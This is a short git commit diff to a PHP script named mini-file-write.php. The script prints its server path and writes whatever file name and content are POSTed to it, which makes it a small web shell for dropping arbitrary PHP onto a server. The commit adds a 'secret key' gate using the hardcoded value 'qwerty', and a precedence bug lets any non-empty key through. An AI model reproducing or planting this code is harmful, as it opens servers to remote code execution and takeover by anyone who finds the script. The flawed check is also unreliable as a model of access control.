3e24ee18f0eaa31250d82e22621b3d5ed5214486
Roma Tykholiz <mmy3uka@gmail.com>
2020-12-13 10:51:32 +0200

    Update mini-file-write.php

--- mini-file-write.php
+++ mini-file-write.php
@@ -1,15 +1,16 @@
 <?php 
+if(!$_GET['secter_key'] == "qwerty"){
+	die();
+}
 echo $_SERVER['SCRIPT_FILENAME']; //show all file path, where is this script located
 echo "<form method='post'>
 <input type='text' name='fname' value='file name example.php'><br />
 <textarea type='text' name='ftext' value='file text <echo php>'></textarea></br >
 <button name='Submit' type='submit'>Submit</button>
 </form>";
-
 if(!empty($_POST['fname']) && !empty($_POST['ftext'])){
 	$fname = fopen($_POST['fname'], 'w+');
 	fwrite($fname, $_POST['ftext']);
 	fclose($fname);
 }
-
  ?>
